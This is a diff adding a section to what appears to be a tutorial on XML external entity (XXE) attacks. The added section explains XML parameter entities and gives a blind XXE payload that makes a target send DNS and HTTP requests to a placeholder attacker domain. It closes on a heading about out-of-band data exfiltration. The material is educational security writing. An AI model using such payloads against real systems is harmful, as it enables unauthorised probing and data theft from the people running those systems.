@@ -212,3 +212,18 @@ there is two way to write xml code injection and it
 - You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
 
 ### Detecting blind XXE using out-of-band (OAST) techniques
+Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
+
+`<!ENTITY % myparameterentity "my parameter entity value" >`
+
+And second, parameter entities are referenced using the percent character instead of the usual ampersand:
+
+`%myparameterentity;`
+
+This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
+
+`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
+
+This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.
+
+### Exploiting blind XXE to exfiltrate data out-of-band
